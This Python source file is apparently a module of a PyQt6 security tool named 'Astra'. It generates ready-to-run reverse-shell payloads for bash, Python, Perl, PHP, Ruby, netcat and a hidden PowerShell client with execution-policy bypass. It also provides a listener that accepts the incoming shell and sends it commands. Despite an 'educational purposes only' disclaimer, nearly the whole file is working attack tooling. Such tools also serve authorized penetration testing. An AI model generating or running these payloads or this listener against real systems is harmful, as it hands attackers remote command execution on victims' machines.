"""
Reverse shell module for Astra

WARNING: This module is for educational purposes only.
Using this functionality against systems without explicit permission is illegal
and unethical. Only use on systems you own or have permission to test.
"""

import socket
import subprocess
import threading
import sys
import os
import platform
import time
from PyQt6.QtCore import QObject, pyqtSignal

class ReverseShellGenerator(QObject):
    """Class to generate reverse shell payloads for different platforms"""
    
    # Signal for payload update
    payload_update = pyqtSignal(str)
    
    # Signal for error
    error = pyqtSignal(str)
    
    def __init__(self):
        super().__init__()
        self.available_shells = {
            "bash": self._generate_bash_shell,
            "python": self._generate_python_shell,
            "perl": self._generate_perl_shell,
            "php": self._generate_php_shell,
            "ruby": self._generate_ruby_shell,
            "netcat": self._generate_netcat_shell,
            "powershell": self._generate_powershell_shell
        }
    
    def get_available_shell_types(self):
        """Return list of available shell types"""
        return list(self.available_shells.keys())
    
    def generate_payload(self, shell_type, host, port):
        """Generate a reverse shell payload of the specified type"""
        if shell_type not in self.available_shells:
            self.error.emit(f"Unknown shell type: {shell_type}")
            return None
        
        try:
            # Validate host and port
            if not host or not port:
                self.error.emit("Host and port are required")
                return None
            
            # Generate payload
            payload = self.available_shells[shell_type](host, port)
            
            # Emit the payload
            self.payload_update.emit(payload)
            return payload
            
        except Exception as e:
            self.error.emit(f"Error generating payload: {str(e)}")
            return None
    
    def _generate_bash_shell(self, host, port):
        """Generate a bash reverse shell payload"""
        return f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
    
    def _generate_python_shell(self, host, port):
        """Generate a Python reverse shell payload"""
        return (
            f"python -c 'import socket,subprocess,os; "
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); "
            f"s.connect((\"{host}\",{port})); "
            f"os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); "
            f"p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
        )
    
    def _generate_perl_shell(self, host, port):
        """Generate a Perl reverse shell payload"""
        return (
            f"perl -e 'use Socket;$i=\"{host}\";$p={port};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");"
            f"open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
        )
    
    def _generate_php_shell(self, host, port):
        """Generate a PHP reverse shell payload"""
        return (
            f"php -r '$sock=fsockopen(\"{host}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        )
    
    def _generate_ruby_shell(self, host, port):
        """Generate a Ruby reverse shell payload"""
        return (
            f"ruby -rsocket -e'f=TCPSocket.open(\"{host}\",{port})."
            f"to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        )
    
    def _generate_netcat_shell(self, host, port):
        """Generate a Netcat reverse shell payload"""
        return f"nc -e /bin/sh {host} {port}"
    
    def _generate_powershell_shell(self, host, port):
        """Generate a PowerShell reverse shell payload"""
        return (
            f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object "
            f"System.Net.Sockets.TCPClient(\"{host}\",{port});"
            f"$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};"
            f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)"
            f"{{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
            f"$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";"
            f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);"
            f"$stream.Flush()}};$client.Close()"
        )


class ReverseShellListener(QObject):
    """Class for creating a reverse shell listener"""
    
    # Signal for connection status
    status_update = pyqtSignal(str)
    
    # Signal for received messages
    message_received = pyqtSignal(str)
    
    # Signal for error
    error = pyqtSignal(str)
    
    def __init__(self):
        super().__init__()
        self._stop_event = threading.Event()
        self._socket = None
        self._client_socket = None
        self._listen_thread = None
        self._receive_thread = None
        
    def start_listener(self, port, timeout=300):
        """Start a reverse shell listener on the specified port"""
        try:
            # Stop any existing listener
            self.stop_listener()
            
            # Reset stop event
            self._stop_event.clear()
            
            # Start a new listener thread
            self._listen_thread = threading.Thread(
                target=self._listen,
                args=(port, timeout),
                daemon=True
            )
            self._listen_thread.start()
            
            self.status_update.emit(f"Listening on port {port}...")
            return True
            
        except Exception as e:
            self.error.emit(f"Error starting listener: {str(e)}")
            return False
    
    def _listen(self, port, timeout):
        """Listen for incoming connections"""
        try:
            # Create socket
            self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Set timeout
            self._socket.settimeout(timeout)
            
            # Bind and listen
            self._socket.bind(('0.0.0.0', port))
            self._socket.listen(1)
            
            while not self._stop_event.is_set():
                try:
                    # Accept connection
                    self._client_socket, address = self._socket.accept()
                    client_ip = address[0]
                    
                    self.status_update.emit(f"Connection received from {client_ip}")
                    
                    # Start message receiver thread
                    self._receive_thread = threading.Thread(
                        target=self._receive_messages,
                        daemon=True
                    )
                    self._receive_thread.start()
                    
                    # Only handle one connection
                    break
                    
                except socket.timeout:
                    if self._stop_event.is_set():
                        break
                    self.status_update.emit("Listener timed out. Still waiting for connection...")
                
        except Exception as e:
            if not self._stop_event.is_set():
                self.error.emit(f"Error in listener: {str(e)}")
        finally:
            if self._stop_event.is_set():
                self.status_update.emit("Listener stopped by user")
    
    def _receive_messages(self):
        """Receive messages from the connected client"""
        try:
            # Set client socket to non-blocking mode
            self._client_socket.setblocking(False)
            
            buffer = ""
            
            while not self._stop_event.is_set():
                try:
                    # Try to receive data
                    chunk = self._client_socket.recv(4096).decode('utf-8', errors='replace')
                    
                    if not chunk:
                        # Connection closed
                        self.status_update.emit("Connection closed by remote host")
                        break
                    
                    # Add to buffer and emit
                    buffer += chunk
                    self.message_received.emit(buffer)
                    buffer = ""
                    
                except BlockingIOError:
                    # No data available, wait a bit
                    time.sleep(0.1)
                except Exception as e:
                    self.error.emit(f"Error receiving data: {str(e)}")
                    break
                    
        except Exception as e:
            if not self._stop_event.is_set():
                self.error.emit(f"Error in receiver: {str(e)}")
        finally:
            if self._client_socket:
                try:
                    self._client_socket.close()
                except:
                    pass
                self._client_socket = None
    
    def send_command(self, command):
        """Send a command to the connected client"""
        if not self._client_socket:
            self.error.emit("No client connected")
            return False
        
        try:
            # Ensure command ends with newline
            if not command.endswith('\n'):
                command += '\n'
            
            # Send command
            self._client_socket.send(command.encode('utf-8'))
            return True
            
        except Exception as e:
            self.error.emit(f"Error sending command: {str(e)}")
            return False
    
    def stop_listener(self):
        """Stop the reverse shell listener"""
        self._stop_event.set()
        
        # Close client socket
        if self._client_socket:
            try:
                self._client_socket.close()
            except:
                pass
            self._client_socket = None
        
        # Close server socket
        if self._socket:
            try:
                self._socket.close()
            except:
                pass
            self._socket = None
        
        # Wait for threads to finish
        if self._listen_thread and self._listen_thread.is_alive():
            self._listen_thread.join(timeout=1.0)
        if self._receive_thread and self._receive_thread.is_alive():
            self._receive_thread.join(timeout=1.0)
            
        self.status_update.emit("Listener stopped")
        return True
